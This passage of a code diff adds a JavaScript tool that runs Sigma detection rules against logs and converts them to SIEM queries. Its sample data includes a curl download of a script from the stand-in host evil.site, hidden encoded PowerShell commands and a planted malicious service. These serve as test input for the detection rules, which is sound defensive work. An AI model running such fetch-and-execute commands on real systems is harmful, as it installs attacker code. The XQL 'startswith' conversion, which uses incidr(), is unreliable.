+  const groupBy = c['group-by'] || c.group_by || [];
+  const cond = c.condition || {};
+
+  // evaluate each referenced rule; collect matching event indices
+  const perRule = refs.map(r => {
+    const results = runDetection(r, events);
+    return { rule: r, hits: results.filter(x => x.hit).map(x => x.idx) };
+  });
+
+  // groupKey for event
+  const keyOf = idx => {
+    const ev = events[idx];
+    return groupBy.map(f => String(ev[f] !== undefined ? ev[f] : '∅')).join(' ┃ ');
+  };
+
+  // ---- TYPE: event_count ----
+  if (type === 'event_count') {
+    const src = perRule[0].hits; // sigma v2: event_count uses a single rule
+    const groups = new Map();
+    for (const idx of src) {
+      const k = keyOf(idx);
+      (groups.get(k) || groups.set(k, []).get(k)).push(idx);
+    }
+    const out = [];
+    for (const [k, idxs] of groups) {
+      // slide a window of `timespan` over the indices; find max count
+      const times = idxs.map(i => eventTime(events[i], i)).sort((a,b) => a-b);
+      const orderedIdx = idxs.slice().sort((a,b) => eventTime(events[a], a) - eventTime(events[b], b));
+      let maxCount = timespan ? 1 : times.length;
+      let windowIdxs = timespan ? [] : orderedIdx.slice();
+      if (timespan) {
+        let left = 0;
+        for (let right = 0; right < times.length; right++) {
+          while (times[right] - times[left] > timespan) left++;
+          if (right - left + 1 > maxCount) { maxCount = right - left + 1; windowIdxs = orderedIdx.slice(left, right + 1); }
+        }
+      }
+      out.push({
+        groupKey: k, groupFields: groupBy, count: maxCount,
+        hit: checkCorrCondition(maxCount, cond),
+        eventIdxs: windowIdxs,
+        allIdxs: idxs,
+      });
+    }
+    return { type, groups: out, rule: corrRule, perRule, cond };
+  }
+
+  // ---- TYPE: value_count ----
+  if (type === 'value_count') {
+    const field = c.field || c['field-name'];
+    if (!field) throw new Error('value_count needs `field`');
+    const src = perRule[0].hits;
+    const groups = new Map();
+    for (const idx of src) {
+      const k = keyOf(idx);
+      (groups.get(k) || groups.set(k, { vals: new Set(), idxs: [] })).vals.add(String(events[idx][field]));
+      groups.get(k).idxs.push(idx);
+    }
+    const out = [];
+    for (const [k, {vals, idxs}] of groups) {
+      out.push({
+        groupKey: k, groupFields: groupBy, count: vals.size,
+        hit: checkCorrCondition(vals.size, cond),
+        eventIdxs: idxs, allIdxs: idxs, valueField: field, valueSet: [...vals]
+      });
+    }
+    return { type, groups: out, rule: corrRule, perRule, cond, field };
+  }
+
+  // ---- TYPE: temporal / temporal_ordered ----
+  if (type === 'temporal' || type === 'temporal_ordered') {
+    const ordered = (type === 'temporal_ordered');
+    // group hit-indices per rule per groupKey
+    const groupMap = new Map();
+    perRule.forEach((pr, ruleIdx) => {
+      for (const idx of pr.hits) {
+        const k = keyOf(idx);
+        if (!groupMap.has(k)) groupMap.set(k, refs.map(() => []));
+        groupMap.get(k)[ruleIdx].push({ idx, t: eventTime(events[idx], idx) });
+      }
+    });
+    const out = [];
+    for (const [k, perRuleIdxs] of groupMap) {
+      const allPresent = perRuleIdxs.every(arr => arr.length > 0);
+      if (!allPresent) {
+        out.push({ groupKey: k, groupFields: groupBy, count: 0, hit: false, eventIdxs: [], allIdxs: perRuleIdxs.flat().map(x=>x.idx), perRuleHits: perRuleIdxs.map(a=>a.length) });
+        continue;
+      }
+      // find any combination within timespan (and ordered, if required)
+      let found = null;
+      if (ordered) {
+        // try to pick earliest increasing chain
+        let prev = -Infinity;
+        const picks = [];
+        for (const arr of perRuleIdxs) {
+          const sorted = arr.slice().sort((a,b) => a.t - b.t);
+          const next = sorted.find(x => x.t >= prev);
+          if (!next) { picks.length = 0; break; }
+          picks.push(next); prev = next.t;
+        }
+        if (picks.length === perRuleIdxs.length) {
+          if (!timespan || picks[picks.length - 1].t - picks[0].t <= timespan) found = picks.map(p => p.idx);
+        }
+      } else {
+        // any window containing at least one from each rule
+        const all = perRuleIdxs.flatMap((arr, ri) => arr.map(x => ({ ri, ...x }))).sort((a, b) => a.t - b.t);
+        for (let i = 0; i < all.length; i++) {
+          const seen = new Map(); // ri -> idx
+          seen.set(all[i].ri, all[i].idx);
+          for (let j = i + 1; j < all.length; j++) {
+            if (timespan && all[j].t - all[i].t > timespan) break;
+            if (!seen.has(all[j].ri)) seen.set(all[j].ri, all[j].idx);
+            if (seen.size === perRuleIdxs.length) { found = [...seen.values()]; break; }
+          }
+          if (found) break;
+        }
+      }
+      out.push({
+        groupKey: k, groupFields: groupBy,
+        count: found ? found.length : 0,
+        hit: !!found,
+        eventIdxs: found || [],
+        allIdxs: perRuleIdxs.flat().map(x => x.idx),
+        perRuleHits: perRuleIdxs.map(a => a.length)
+      });
+    }
+    return { type, groups: out, rule: corrRule, perRule, cond, ordered };
+  }
+
+  throw new Error('Unsupported correlation type: ' + type);
+}
+
+/* ═════════ TOP-LEVEL RUNNER ═════════ */
+function runRule(yamlText, events) {
+  const graph = parseRuleGraph(yamlText);
+  // primary rule = last document (Sigma v2 convention: correlation at bottom)
+  const primary = graph.docs[graph.docs.length - 1];
+  if (primary.correlation) {
+    return { kind: 'correlation', graph, result: runCorrelation(primary, graph, events) };
+  }
+  // single detection
+  if (primary.detection) {
+    return { kind: 'detection', graph, rule: primary, result: runDetection(primary, events) };
+  }
+  throw new Error('Primary rule has neither `detection` nor `correlation`');
+}
+
+/* ═══════════════════════════════════════════════════════════
+   BACKEND CONVERTERS
+   ═══════════════════════════════════════════════════════════ */
+
+/* ---- small helpers used by converters ---- */
+function normalizeSelectionValues(v) { return Array.isArray(v) ? v : [v]; }
+function escLuceneValue(v, wildcard) {
+  // escape for Lucene; caller decides whether to wrap in quotes
+  let s = String(v);
+  // escape backslash first
+  s = s.replace(/\\/g, '\\\\');
+  // escape reserved chars
+  s = s.replace(/([+\-!(){}\[\]^"~:\/])/g, '\\$1');
+  // escape AND/OR/NOT when bare
+  return s;
+}
+function quoteStr(v) { return '"' + String(v).replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"'; }
+function kqlStr(v)   { return '"' + String(v).replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"'; }
+function isNumericish(v) { return typeof v === 'number' || /^-?\d+(?:\.\d+)?$/.test(String(v)); }
+
+/* build an AST from a selection so we can render it per backend */
+function selectionToAST(sel) {
+  // returns { op: 'and'|'or', items: [clause|AST] }
+  // clause: { field, mods: string[], values: string[] }
+  if (Array.isArray(sel)) return { op: 'or', items: sel.map(selectionToAST) };
+  const items = [];
+  for (const [full, expected] of Object.entries(sel)) {
+    const parts = full.split('|');
+    const field = parts[0];
+    const mods = parts.slice(1);
+    const values = normalizeSelectionValues(expected);
+    items.push({ field, mods, values, all: mods.includes('all') });
+  }
+  return { op: 'and', items };
+}
+
+/* render condition: given AST per selection name and a condition string,
+   returns a backend-agnostic tree of { type: 'sel'|'and'|'or'|'not', ... } */
+function renderCondition(condition, selAsts) {
+  const keys = Object.keys(selAsts);
+  let e = ' ' + condition + ' ';
+  e = e.replace(/\ball of them\b/gi, '(' + keys.join(' AND ') + ')');
+  e = e.replace(/\b1 of them\b/gi, '(' + keys.join(' OR ') + ')');
+  e = e.replace(/\bany of them\b/gi, '(' + keys.join(' OR ') + ')');
+  e = e.replace(/\ball of ([a-zA-Z_][\w]*)\*/g, (_,p) => {
+    const k = keys.filter(x => x.startsWith(p));
+    return k.length ? '(' + k.join(' AND ') + ')' : 'FALSE';
+  });
+  e = e.replace(/\b1 of ([a-zA-Z_][\w]*)\*/g, (_,p) => {
+    const k = keys.filter(x => x.startsWith(p));
+    return k.length ? '(' + k.join(' OR ') + ')' : 'FALSE';
+  });
+  // parse expression
+  return parseBoolExpr(e.trim(), selAsts);
+}
+function parseBoolExpr(src, selAsts) {
+  // Shunting-yard-ish: tokenize then build tree
+  const tokens = [];
+  let i = 0;
+  while (i < src.length) {
+    const c = src[i];
+    if (/\s/.test(c)) { i++; continue; }
+    if (c === '(' || c === ')') { tokens.push(c); i++; continue; }
+    // word
+    let j = i;
+    while (j < src.length && /[\w*]/.test(src[j])) j++;
+    const word = src.slice(i, j);
+    i = j;
+    const lower = word.toLowerCase();
+    if (lower === 'and' || lower === 'or' || lower === 'not') tokens.push(lower.toUpperCase());
+    else tokens.push({ type: 'sel', name: word });
+  }
+  // recursive descent
+  let pos = 0;
+  function peek() { return tokens[pos]; }
+  function eat(t) { if (peek() === t) { pos++; return true; } return false; }
+  function parseOr() {
+    let left = parseAnd();
+    while (peek() === 'OR') { pos++; const right = parseAnd(); left = { type: 'or', left, right }; }
+    return left;
+  }
+  function parseAnd() {
+    let left = parseNot();
+    while (peek() === 'AND') { pos++; const right = parseNot(); left = { type: 'and', left, right }; }
+    return left;
+  }
+  function parseNot() {
+    if (peek() === 'NOT') { pos++; return { type: 'not', child: parseNot() }; }
+    return parseAtom();
+  }
+  function parseAtom() {
+    const t = peek();
+    if (t === '(') { pos++; const node = parseOr(); eat(')'); return node; }
+    if (typeof t === 'object' && t.type === 'sel') { pos++;
+      if (t.name === 'FALSE') return { type: 'const', value: false };
+      if (t.name === 'TRUE')  return { type: 'const', value: true };
+      const ast = selAsts[t.name];
+      if (!ast) return { type: 'const', value: false };
+      return { type: 'sel', name: t.name, ast };
+    }
+    return { type: 'const', value: false };
+  }
+  return parseOr();
+}
+
+/* ───── ELASTIC LUCENE ───── */
+function clauseToLucene(field, mods, values, all) {
+  const parts = values.map(v => {
+    if (mods.includes('re')) return field + ':/' + String(v).replace(/\//g,'\\/') + '/';
+    if (mods.includes('gt'))  return field + ':>'  + v;
+    if (mods.includes('gte')) return field + ':>=' + v;
+    if (mods.includes('lt'))  return field + ':<'  + v;
+    if (mods.includes('lte')) return field + ':<=' + v;
+    let s = String(v);
+    // lucene escape, then add wildcards
+    const esc = escLuceneValue(s);
+    if (mods.includes('contains'))   return field + ':*' + esc + '*';
+    if (mods.includes('startswith')) return field + ':'  + esc + '*';
+    if (mods.includes('endswith'))   return field + ':*' + esc;
+    // numeric bare, string quoted
+    if (isNumericish(v)) return field + ':' + v;
+    return field + ':"' + String(v).replace(/\\/g,'\\\\').replace(/"/g,'\\"') + '"';
+  });
+  const joined = parts.join(all ? ' AND ' : ' OR ');
+  return parts.length > 1 ? '(' + joined + ')' : joined;
+}
+function astToLucene(node) {
+  if (node.type === 'const') return node.value ? '*:*' : '(NOT *:*)';
+  if (node.type === 'not') return '(NOT ' + astToLucene(node.child) + ')';
+  if (node.type === 'and') return '(' + astToLucene(node.left) + ' AND ' + astToLucene(node.right) + ')';
+  if (node.type === 'or')  return '(' + astToLucene(node.left) + ' OR '  + astToLucene(node.right) + ')';
+  if (node.type === 'sel') {
+    const parts = [];
+    for (const it of node.ast.items) {
+      if (it.op) parts.push(astToLuceneSel(it));
+      else parts.push(clauseToLucene(it.field, it.mods, it.values, it.all));
+    }
+    const glue = node.ast.op === 'and' ? ' AND ' : ' OR ';
+    return parts.length > 1 ? '(' + parts.join(glue) + ')' : parts[0];
+  }
+  return '';
+}
+function astToLuceneSel(astNode) {
+  const parts = astNode.items.map(it => it.op ? astToLuceneSel(it) : clauseToLucene(it.field, it.mods, it.values, it.all));
+  const glue = astNode.op === 'and' ? ' AND ' : ' OR ';
+  return parts.length > 1 ? '(' + parts.join(glue) + ')' : parts[0];
+}
+function toLucene(rule) {
+  const selAsts = {};
+  for (const [k, v] of Object.entries(rule.detection)) {
+    if (k === 'condition' || k === 'timeframe') continue;
+    selAsts[k] = selectionToAST(v);
+  }
+  const tree = renderCondition(rule.detection.condition, selAsts);
+  return astToLucene(tree);
+}
+
+/* ───── SPLUNK SPL ───── */
+function clauseToSPL(field, mods, values, all) {
+  const parts = values.map(v => {
+    if (mods.includes('re')) return field + '=' + quoteStr(String(v)); // approx: use regex command separately
+    if (mods.includes('gt'))  return field + '>'  + v;
+    if (mods.includes('gte')) return field + '>=' + v;
+    if (mods.includes('lt'))  return field + '<'  + v;
+    if (mods.includes('lte')) return field + '<=' + v;
+    const sv = String(v);
+    if (mods.includes('contains'))   return field + '=' + quoteStr('*' + sv + '*');
+    if (mods.includes('startswith')) return field + '=' + quoteStr(sv + '*');
+    if (mods.includes('endswith'))   return field + '=' + quoteStr('*' + sv);
+    if (isNumericish(v)) return field + '=' + v;
+    return field + '=' + quoteStr(sv);
+  });
+  const joined = parts.join(all ? ' AND ' : ' OR ');
+  return parts.length > 1 ? '(' + joined + ')' : joined;
+}
+function astToSPL(node) {
+  if (node.type === 'const') return node.value ? '*' : 'NOT *';
+  if (node.type === 'not') return 'NOT (' + astToSPL(node.child) + ')';
+  if (node.type === 'and') return '(' + astToSPL(node.left) + ' AND ' + astToSPL(node.right) + ')';
+  if (node.type === 'or')  return '(' + astToSPL(node.left) + ' OR '  + astToSPL(node.right) + ')';
+  if (node.type === 'sel') {
+    return renderSelSPL(node.ast);
+  }
+  return '';
+}
+function renderSelSPL(astNode) {
+  const parts = astNode.items.map(it => it.op ? renderSelSPL(it) : clauseToSPL(it.field, it.mods, it.values, it.all));
+  const glue = astNode.op === 'and' ? ' AND ' : ' OR ';
+  return parts.length > 1 ? '(' + parts.join(glue) + ')' : parts[0];
+}
+function toSPL(rule) {
+  const selAsts = {};
+  for (const [k, v] of Object.entries(rule.detection)) {
+    if (k === 'condition' || k === 'timeframe') continue;
+    selAsts[k] = selectionToAST(v);
+  }
+  const tree = renderCondition(rule.detection.condition, selAsts);
+  return astToSPL(tree);
+}
+
+/* ───── SENTINEL KQL (Microsoft) ───── */
+function clauseToKQL(field, mods, values, all) {
+  const parts = values.map(v => {
+    const sv = String(v);
+    if (mods.includes('re')) return field + ' matches regex ' + kqlStr(sv);
+    if (mods.includes('gt'))  return field + ' > ' + (isNumericish(v) ? v : kqlStr(sv));
+    if (mods.includes('gte')) return field + ' >= ' + (isNumericish(v) ? v : kqlStr(sv));
+    if (mods.includes('lt'))  return field + ' < ' + (isNumericish(v) ? v : kqlStr(sv));
+    if (mods.includes('lte')) return field + ' <= ' + (isNumericish(v) ? v : kqlStr(sv));
+    const ci = mods.includes('cased') ? '_cs' : '';
+    if (mods.includes('contains'))   return field + ' contains'   + ci + ' ' + kqlStr(sv);
+    if (mods.includes('startswith')) return field + ' startswith' + ci + ' ' + kqlStr(sv);
+    if (mods.includes('endswith'))   return field + ' endswith'   + ci + ' ' + kqlStr(sv);
+    if (isNumericish(v)) return field + ' == ' + v;
+    return field + ' =~ ' + kqlStr(sv); // =~ is case-insensitive equals
+  });
+  const joined = parts.join(all ? ' and ' : ' or ');
+  return parts.length > 1 ? '(' + joined + ')' : joined;
+}
+function astToKQL(node) {
+  if (node.type === 'const') return node.value ? 'true' : 'false';
+  if (node.type === 'not') return 'not (' + astToKQL(node.child) + ')';
+  if (node.type === 'and') return '(' + astToKQL(node.left) + ' and ' + astToKQL(node.right) + ')';
+  if (node.type === 'or')  return '(' + astToKQL(node.left) + ' or '  + astToKQL(node.right) + ')';
+  if (node.type === 'sel') return renderSelKQL(node.ast);
+  return '';
+}
+function renderSelKQL(astNode) {
+  const parts = astNode.items.map(it => it.op ? renderSelKQL(it) : clauseToKQL(it.field, it.mods, it.values, it.all));
+  const glue = astNode.op === 'and' ? ' and ' : ' or ';
+  return parts.length > 1 ? '(' + parts.join(glue) + ')' : parts[0];
+}
+function toKQL(rule) {
+  const selAsts = {};
+  for (const [k, v] of Object.entries(rule.detection)) {
+    if (k === 'condition' || k === 'timeframe') continue;
+    selAsts[k] = selectionToAST(v);
+  }
+  const tree = renderCondition(rule.detection.condition, selAsts);
+  const table = guessTable(rule);
+  return table + '\n| where ' + astToKQL(tree);
+}
+function guessTable(rule) {
+  const ls = rule.logsource || {};
+  if (ls.product === 'windows') {
+    if (ls.service === 'security') return 'SecurityEvent';
+    if (ls.service === 'sysmon')   return 'Event // Sysmon';
+    return 'SecurityEvent';
+  }
+  if (ls.product === 'linux') return 'Syslog';
+  return 'SecurityEvent';
+}
+
+/* ───── CORTEX XSIAM / XDR (XQL) ───── */
+function clauseToXQL(field, mods, values, all) {
+  const parts = values.map(v => {
+    const sv = String(v);
+    if (mods.includes('re')) return field + ' ~= ' + kqlStr(sv);
+    if (mods.includes('gt'))  return field + ' > '  + (isNumericish(v) ? v : kqlStr(sv));
+    if (mods.includes('gte')) return field + ' >= ' + (isNumericish(v) ? v : kqlStr(sv));
+    if (mods.includes('lt'))  return field + ' < '  + (isNumericish(v) ? v : kqlStr(sv));
+    if (mods.includes('lte')) return field + ' <= ' + (isNumericish(v) ? v : kqlStr(sv));
+    if (mods.includes('contains'))   return field + ' contains '   + kqlStr(sv);
+    if (mods.includes('startswith')) return 'incidr(' + field + ', ' + kqlStr(sv) + ')' ; // XQL lacks prefix op; fallback to regex
+    if (mods.includes('endswith'))   return field + ' ~= '         + kqlStr('.*' + sv.replace(/[.*+?^${}()|[\]\\]/g,'\\$&') + '$');
+    if (isNumericish(v)) return field + ' = ' + v;
+    return field + ' = ' + kqlStr(sv);
+  });
+  const joined = parts.join(all ? ' and ' : ' or ');
+  return parts.length > 1 ? '(' + joined + ')' : joined;
+}
+function astToXQL(node) {
+  if (node.type === 'const') return node.value ? 'true' : 'false';
+  if (node.type === 'not') return 'not (' + astToXQL(node.child) + ')';
+  if (node.type === 'and') return '(' + astToXQL(node.left) + ' and ' + astToXQL(node.right) + ')';
+  if (node.type === 'or')  return '(' + astToXQL(node.left) + ' or '  + astToXQL(node.right) + ')';
+  if (node.type === 'sel') return renderSelXQL(node.ast);
+  return '';
+}
+function renderSelXQL(astNode) {
+  const parts = astNode.items.map(it => it.op ? renderSelXQL(it) : clauseToXQL(it.field, it.mods, it.values, it.all));
+  const glue = astNode.op === 'and' ? ' and ' : ' or ';
+  return parts.length > 1 ? '(' + parts.join(glue) + ')' : parts[0];
+}
+function toXQL(rule) {
+  const selAsts = {};
+  for (const [k, v] of Object.entries(rule.detection)) {
+    if (k === 'condition' || k === 'timeframe') continue;
+    selAsts[k] = selectionToAST(v);
+  }
+  const tree = renderCondition(rule.detection.condition, selAsts);
+  const ls = rule.logsource || {};
+  const ds = ls.product === 'windows' ? 'xdr_data' : ls.product === 'linux' ? 'xdr_data' : 'xdr_data';
+  return 'dataset = ' + ds + '\n| filter ' + astToXQL(tree);
+}
+
+/* ───── LOGPOINT ───── */
+function clauseToLP(field, mods, values, all) {
+  const parts = values.map(v => {
+    const sv = String(v);
+    if (mods.includes('re'))  return field + '=' + quoteStr(sv);
+    if (mods.includes('gt'))  return field + '>'  + (isNumericish(v) ? v : quoteStr(sv));
+    if (mods.includes('gte')) return field + '>=' + (isNumericish(v) ? v : quoteStr(sv));
+    if (mods.includes('lt'))  return field + '<'  + (isNumericish(v) ? v : quoteStr(sv));
+    if (mods.includes('lte')) return field + '<=' + (isNumericish(v) ? v : quoteStr(sv));
+    if (mods.includes('contains'))   return field + '=' + quoteStr('*' + sv + '*');
+    if (mods.includes('startswith')) return field + '=' + quoteStr(sv + '*');
+    if (mods.includes('endswith'))   return field + '=' + quoteStr('*' + sv);
+    if (isNumericish(v)) return field + '=' + v;
+    return field + '=' + quoteStr(sv);
+  });
+  const joined = parts.join(all ? ' AND ' : ' OR ');
+  return parts.length > 1 ? '(' + joined + ')' : joined;
+}
+function astToLP(node) {
+  if (node.type === 'const') return node.value ? '*' : '-*';
+  if (node.type === 'not') return '-(' + astToLP(node.child) + ')';
+  if (node.type === 'and') return '(' + astToLP(node.left) + ' ' + astToLP(node.right) + ')';
+  if (node.type === 'or')  return '(' + astToLP(node.left) + ' OR '  + astToLP(node.right) + ')';
+  if (node.type === 'sel') return renderSelLP(node.ast);
+  return '';
+}
+function renderSelLP(astNode) {
+  const parts = astNode.items.map(it => it.op ? renderSelLP(it) : clauseToLP(it.field, it.mods, it.values, it.all));
+  const glue = astNode.op === 'and' ? ' ' : ' OR ';
+  return parts.length > 1 ? '(' + parts.join(glue) + ')' : parts[0];
+}
+function toLogpoint(rule) {
+  const selAsts = {};
+  for (const [k, v] of Object.entries(rule.detection)) {
+    if (k === 'condition' || k === 'timeframe') continue;
+    selAsts[k] = selectionToAST(v);
+  }
+  const tree = renderCondition(rule.detection.condition, selAsts);
+  return astToLP(tree);
+}
+
+/* ═════════ CORRELATION CONVERTERS ═════════ */
+function corrOpSigma(cond) {
+  if ('gte' in cond) return { op: '>=', n: cond.gte };
+  if ('gt'  in cond) return { op: '>',  n: cond.gt };
+  if ('lte' in cond) return { op: '<=', n: cond.lte };
+  if ('lt'  in cond) return { op: '<',  n: cond.lt };
+  if ('eq'  in cond) return { op: '==', n: cond.eq };
+  return { op: '>=', n: 1 };
+}
+function corrToLucene(corr, graph) {
+  const ref = graph.byName[corr.correlation.rules[0]];
+  if (!ref) return '# unresolved rule: ' + corr.correlation.rules[0];
+  const base = toLucene(ref);
+  return '# base query (index-time)\n' + base + '\n# correlation: cannot be expressed in Lucene alone — use ES|QL / Kibana watcher:\n# | STATS count = COUNT(*) BY ' + (corr.correlation['group-by'] || []).join(', ') + '\n# | WHERE count ' + corrOpSigma(corr.correlation.condition).op + ' ' + corrOpSigma(corr.correlation.condition).n;
+}
+function corrToSPL(corr, graph) {
+  const c = corr.correlation;
+  const ref = graph.byName[c.rules[0]];
+  if (!ref) return '# unresolved rule';
+  const base = toSPL(ref);
+  const { op, n } = corrOpSigma(c.condition);
+  const ts = c.timespan ? ('earliest=-' + c.timespan + ' ') : '';
+  if (c.type === 'value_count') {
+    return ts + base + '\n| stats dc(' + c.field + ') as cnt by ' + (c['group-by']||[]).join(', ') +
+           '\n| where cnt ' + op + ' ' + n;
+  }
+  return ts + base + '\n| stats count as cnt by ' + (c['group-by']||[]).join(', ') +
+         '\n| where cnt ' + op + ' ' + n;
+}
+function corrToKQL(corr, graph) {
+  const c = corr.correlation;
+  const ref = graph.byName[c.rules[0]];
+  if (!ref) return '// unresolved rule';
+  const base = toKQL(ref);
+  const { op, n } = corrOpSigma(c.condition);
+  const span = c.timespan || '1h';
+  const binExpr = 'bin(TimeGenerated, ' + span + ')';
+  if (c.type === 'value_count') {
+    return base + '\n| summarize cnt = dcount(' + c.field + ') by ' + (c['group-by']||[]).concat([binExpr]).join(', ') +
+           '\n| where cnt ' + op + ' ' + n;
+  }
+  return base + '\n| summarize cnt = count() by ' + (c['group-by']||[]).concat([binExpr]).join(', ') +
+         '\n| where cnt ' + op + ' ' + n;
+}
+function corrToXQL(corr, graph) {
+  const c = corr.correlation;
+  const ref = graph.byName[c.rules[0]];
+  if (!ref) return '// unresolved rule';
+  const base = toXQL(ref);
+  const { op, n } = corrOpSigma(c.condition);
+  if (c.type === 'value_count') {
+    return base + '\n| comp count_distinct(' + c.field + ') as cnt by ' + (c['group-by']||[]).join(', ') +
+           '\n| filter cnt ' + op + ' ' + n;
+  }
+  return base + '\n| comp count() as cnt by ' + (c['group-by']||[]).join(', ') +
+         '\n| filter cnt ' + op + ' ' + n;
+}
+function corrToLogpoint(corr, graph) {
+  const c = corr.correlation;
+  const ref = graph.byName[c.rules[0]];
+  if (!ref) return '# unresolved rule';
+  const base = toLogpoint(ref);
+  const { op, n } = corrOpSigma(c.condition);
+  if (c.type === 'value_count') {
+    return base + '\n| chart distinct_count(' + c.field + ') as cnt by ' + (c['group-by']||[]).join(', ') +
+           '\n| filter cnt ' + op + ' ' + n;
+  }
+  return base + '\n| chart count() as cnt by ' + (c['group-by']||[]).join(', ') +
+         '\n| filter cnt ' + op + ' ' + n;
+}
+
+/* ═════════ BACKENDS REGISTRY ═════════ */
+const BACKENDS = [
+  { id: 'lucene',   name: 'ELASTIC',  fmt: 'Lucene / KQL', note: 'Lucene syntax accepted by Elasticsearch query_string. Leading wildcards require allow_leading_wildcard=true.',
+    det: toLucene, corr: corrToLucene },
+  { id: 'spl',      name: 'SPLUNK',   fmt: 'SPL',          note: 'Basic SPL search. Adjust sourcetype / index prefix for your deployment.',
+    det: toSPL, corr: corrToSPL },
+  { id: 'kql',      name: 'SENTINEL', fmt: 'KQL',          note: 'Microsoft Sentinel / Defender XDR KQL. Table guess is a hint only — replace with your actual table.',
+    det: toKQL, corr: corrToKQL },
+  { id: 'xql',      name: 'CORTEX',   fmt: 'XSIAM · XQL',  note: 'Palo Alto XSIAM / XDR. Field names are Sigma-native — map to Cortex XDM fields for production use.',
+    det: toXQL, corr: corrToXQL },
+  { id: 'logpoint', name: 'LOGPOINT', fmt: 'LP Query',     note: 'Logpoint query syntax. Pipe stages for correlation assume modern Logpoint.',
+    det: toLogpoint, corr: corrToLogpoint },
+];
+
+/* ═════════ EXAMPLES ═════════ */
+const EX = {
+  rule1: `title: Suspicious PowerShell Encoded Command
+id: 11111111-2222-3333-4444-555555555555
+description: Detects PowerShell with encoded command flag (-enc / -EncodedCommand)
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    EventID: 4688
+    NewProcessName|endswith:
+      - '\\\\powershell.exe'
+      - '\\\\pwsh.exe'
+    CommandLine|contains:
+      - ' -enc '
+      - ' -EncodedCommand '
+      - ' -e '
+  condition: selection
+level: high
+`,
+  rule2: `title: New Windows Service Installed
+logsource:
+  product: windows
+  service: system
+detection:
+  selection:
+    Provider.Name: 'Service Control Manager'
+    EventID: 7045
+  filter_benign:
+    ServiceName|contains:
+      - 'Windows Update'
+  condition: selection and not filter_benign
+level: medium
+`,
+  rule3: `title: Suspicious Curl/Wget (Linux)
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection:
+    type: SYSCALL
+    exe|endswith:
+      - '/curl'
+      - '/wget'
+  condition: selection
+level: medium
+`,
+  rule4: `title: Write to sudoers (Linux)
+logsource:
+  product: linux
+  category: file_event
+detection:
+  selection:
+    SYSCALL.exe|endswith:
+      - '/sudo'
+      - '/visudo'
+      - '/su'
+    PATH.name|contains:
+      - '/etc/sudoers'
+  condition: selection
+level: high
+`,
+  // Sigma v2 correlation: event_count
+  rule5: `title: Failed Logon Attempt
+name: failed_logon
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4625
+  condition: selection
+---
+title: Multiple Failed Logons For Single User (Bruteforce)
+status: experimental
+correlation:
+  type: event_count
+  rules:
+    - failed_logon
+  group-by:
+    - TargetUserName
+  timespan: 5m
+  condition:
+    gte: 5
+level: high
+`,
+  // Sigma v2 correlation: temporal
+  rule6: `title: Recon Command
+name: recon_cmd
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection:
+    type: SYSCALL
+    exe|endswith:
+      - '/whoami'
+      - '/id'
+      - '/hostname'
+  condition: selection
+---
+title: Privilege Escalation Attempt
+name: privesc_sudo
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection:
+    type: SYSCALL
+    exe|endswith: '/sudo'
+  condition: selection
+---
+title: Recon Then Privesc (Temporal)
+correlation:
+  type: temporal_ordered
+  rules:
+    - recon_cmd
+    - privesc_sudo
+  group-by:
+    - uid
+  timespan: 10m
+level: high
+`,
+
+  data1: `<Events>
+  <Event>
+    <` + `System>
+      <Provider Name="Microsoft-Windows-Security-Auditing"/>
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-04-23T10:12:44Z"/>
+      <Computer>WKS-07</Computer>
+    </` + `System>
+    <EventData>
+      <Data Name="SubjectUserName">alice</Data>
+      <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
+      <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <` + `System>
+      <Provider Name="Microsoft-Windows-Security-Auditing"/>
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-04-23T10:13:02Z"/>
+      <Computer>WKS-07</Computer>
+    </` + `System>
+    <EventData>
+      <Data Name="SubjectUserName">bob</Data>
+      <Data Name="NewProcessName">C:\\Windows\\System32\\notepad.exe</Data>
+      <Data Name="CommandLine">notepad.exe C:\\users\\bob\\todo.txt</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <` + `System>
+      <Provider Name="Microsoft-Windows-Security-Auditing"/>
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-04-23T10:14:21Z"/>
+      <Computer>WKS-12</Computer>
+    </` + `System>
+    <EventData>
+      <Data Name="SubjectUserName">svc_backup</Data>
+      <Data Name="NewProcessName">C:\\Program Files\\PowerShell\\7\\pwsh.exe</Data>
+      <Data Name="CommandLine">pwsh.exe -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQA=</Data>
+    </EventData>
+  </Event>
+</Events>
+`,
+  data2: `<Events>
+  <Event>
+    <` + `System>
+      <Provider Name="Service Control Manager"/>
+      <EventID>7045</EventID>
+      <TimeCreated SystemTime="2026-04-23T09:01:12Z"/>
+      <Computer>SRV-DB-01</Computer>
+    </` + `System>
+    <EventData>
+      <Data Name="ServiceName">EvilSvc</Data>
+      <Data Name="ImagePath">C:\\ProgramData\\evil.exe</Data>
+      <Data Name="StartType">auto start</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <` + `System>
+      <Provider Name="Service Control Manager"/>
+      <EventID>7045</EventID>
+      <TimeCreated SystemTime="2026-04-23T09:02:55Z"/>
+      <Computer>SRV-DB-01</Computer>
+    </` + `System>
+    <EventData>
+      <Data Name="ServiceName">Windows Update Medic Service</Data>
+      <Data Name="ImagePath">C:\\Windows\\System32\\svchost.exe</Data>
+      <Data Name="StartType">demand start</Data>
+    </EventData>
+  </Event>
+</Events>
+`,
+  data3: `type=SYSCALL msg=audit(1729689600.123:987): arch=c000003e syscall=59 success=yes exit=0 a0=7f comm="curl" exe="/usr/bin/curl" uid=1000 gid=1000 euid=1000 tty=pts0 key="cmd_exec"
+type=EXECVE msg=audit(1729689600.123:987): argc=4 a0="curl" a1="https://evil.site/x.sh" a2="-fsSL" a3="-o/tmp/x"
+type=PATH msg=audit(1729689600.123:987): item=0 name="/usr/bin/curl" inode=111 mode=0100755
